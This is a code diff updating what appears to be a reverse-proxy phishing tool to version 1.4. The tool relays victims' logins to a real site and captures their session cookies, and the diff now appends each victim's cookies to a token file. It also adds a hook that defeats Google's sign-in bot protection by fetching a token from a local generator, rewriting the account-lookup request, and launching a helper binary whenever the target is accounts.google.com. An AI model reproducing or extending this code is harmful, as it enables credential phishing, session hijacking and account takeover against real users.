@@ -1,8 +1,10 @@
 #! /usr/bin/env python3
  
+# from os import execlpe
+import subprocess
 import requests, json, time, re
 from datetime import datetime
-from sys import exit
+from sys import exit, platform
 import argparse, logging, ssl
 from http.cookies import SimpleCookie
 from helper import *
@@ -12,7 +14,7 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 # from urllib.parse import unquote, quote_plus
 
-VERSION = 'v1.3'
+VERSION = 'v1.4'
 CONFIG = ''
 LEVEL = ''
 
@@ -26,7 +28,7 @@ def banner():
     '''+RED+'''(('''+GREEN+'''/ __| |_ _|  | _ \  | || | | __| | _ \  '''+RED+'''(_)'''+GREEN+''') __| |_ _|  | \| | \ \/ / '''+PURPLE+'''
      | (__   | |   |  _/  | __ | | _|  |   /    | (_ |  | |   | .` |  >  <  '''+GREEN+'''
       \___| |___|  |_|    |_||_| |___| |_|_\     \___| |___|  |_|\_| /_/\_\                                    
-    '''+RED+'''  =================================================+===================='''
+    '''+RED+'''  ====================================================================='''
     by = '''
 	+-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+	
 	|C| |i| |p| |h| |e| |r| |a| |s|
@@ -143,15 +145,21 @@ def parseCookie(cookie):
             cook['value'] = v.value
             cook['domain'] = v['domain']
             cook['path'] = v['path']
-            ts = datetime.strptime(v['expires'], '%a, %d-%b-%Y %H:%M:%S GMT').timestamp()
+            try:
+                ts = datetime.strptime(v['expires'], '%a, %d-%b-%Y %H:%M:%S GMT').timestamp()
+            except Exception as e:
+                ts = v['expires']
+                logging.warning(RED + 'different timestamp format, sending raw timestamp')
+                logging.debug(e, exc_info=True)
+                pass
             cook['expirationDate'] = int(ts) 
             cl.append(cook)
     print(BGORANGE + json.dumps(cl) + RESET)
     try:
-        with open('token.txt', 'w') as f:
-            f.write(json.dumps(cl))
+        with open('token.txt', 'a') as f:
+            f.write(json.dumps(cl) + '\n')
     except Exception as e:
-        logging.error('failed to write cookies')
+        logging.error(RED + 'failed to write cookies')
         logging.debug(e, exc_info=True)
 
 class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
@@ -225,6 +233,11 @@ class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
                 content_len = int(self.headers['Content-Length'])
             post_body = self.rfile.read(content_len)
             print(GREEN, post_body, RESET)
+            ## google-anti-botguard
+            if '/accountlookup' in self.path:
+                token = requests.get("http://localhost:8081?e="+re.findall('f.req=%5B%22.*?%22',str(post_body))[0].split('%22')[1]).text
+                post_body = re.sub(b'identifier%22%2C%22%3C.*%22', b'identifier%22%2C%22%3C'+bytes(token,encoding='utf8')+b'%22', post_body)
+            ##
             injbody = injectReqBody(post_body, self.path)
             # Call the target hostname
             resp = self.s.post(url, data=injbody, headers=injectHeaders(req_header, url, str(len(injbody)), self.path), verify=False,)
@@ -288,6 +301,8 @@ def runServer():
         httpd = ThreadedHTTPServer(server_address, ProxyHTTPRequestHandler)
         if isSSL:
             httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='cert/server.pem')
+        if hostname=="accounts.google.com":
+            subprocess.Popen(['bin/generate.exe']) if platform=='win32' else subprocess.Popen(['bin/generate'])
         logging.info('HTTP server is running as reverse proxy')
         httpd.serve_forever()
     except KeyboardInterrupt:
